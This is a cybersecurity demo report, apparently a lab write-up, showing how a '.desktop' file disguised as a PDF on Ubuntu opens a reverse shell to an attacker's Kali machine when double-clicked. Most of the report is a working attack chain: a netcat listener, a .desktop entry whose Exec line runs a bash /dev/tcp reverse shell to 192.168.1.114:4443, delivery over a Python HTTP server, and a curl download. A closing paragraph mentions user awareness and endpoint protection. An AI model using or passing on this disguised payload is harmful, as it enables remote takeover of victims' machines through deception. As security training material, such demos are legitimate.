
# Cybersecurity Demo Report – Reverse Shell via `.desktop` File

## 1. Objective

This demo showcases a phishing-style reverse shell attack using a disguised `.desktop` file on Ubuntu.  
When the victim double-clicks the file, it initiates a reverse shell back to the attacker’s Kali machine without opening a terminal or requiring further interaction.

## 2. Environment Setup

- **Attacker:** Kali Linux  
- **Victim:** Ubuntu Desktop VM  
- **Listener Tool:** Netcat (nc)  
- **Network:** Bridged Adapter with IP `192.168.1.114` (Kali)


## 3. Tools Used

- Netcat for listening on the attacker's side  
- Bash reverse shell payload embedded in a `.desktop` file  
- Python HTTP server for file delivery  
- `curl` for file download


## 4. Attack Scenario

A `.desktop` file named `importantFile.pdf.desktop` was created with a malicious `Exec` command that opens a reverse shell to the attacker's machine.  
When the file is made executable and allowed for launching in Ubuntu, double-clicking it initiates a shell session back to the attacker.

## 5. Execution Steps

**Step 1:** Start Netcat listener on Kali  
```bash
nc -lvnp 4443
````

![Netcat Listener](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/Environment%20Setup%20Screenshot.png)

**Step 2:** Create the `.desktop` file with embedded reverse shell

```desktop
[Desktop Entry]
Name=importantFile.pdf
Exec=bash -i >& /dev/tcp/192.168.1.114/4443 0>&1
Terminal=false
Type=Application
```

![Desktop File Content](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/Tools%20Overview.png)


**Step 3:** Deliver file to victim via Python HTTP server

```bash
python3 -m http.server 8888
```
![File Hosting](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/open%20Python%20Server.png)  

![File Hosting](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/File%20Download.png)  


**Step 4:** Victim downloads and double-clicks the file

```bash
curl http://192.168.1.114:8888/importantFile.pdf.desktop -o ~/Desktop/importantFile.pdf.desktop
```

![Victim Desktop](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/Malicious%20.desktop%20File.png)

**Step 5:** Reverse shell session is established

![Reverse Shell Connection](https://raw.githubusercontent.com/Marwan123-web/RCE-Attack/main/images/Ubuntu%20Launch%20Prompt.png)

## 6. Sources Used

* [https://www.kali.org](https://www.kali.org)
* [https://book.hacktricks.xyz](https://book.hacktricks.xyz)
* [https://askubuntu.com/questions/1029655/what-does-allow-launching-actually-do](https://askubuntu.com/questions/1029655/what-does-allow-launching-actually-do)

## 7. Conclusion

This demo successfully demonstrates how a seemingly harmless `.desktop` file can be used to gain reverse shell access to a victim's machine with minimal interaction.
The technique highlights the importance of user awareness, file execution policies, and endpoint protection in preventing such attacks.

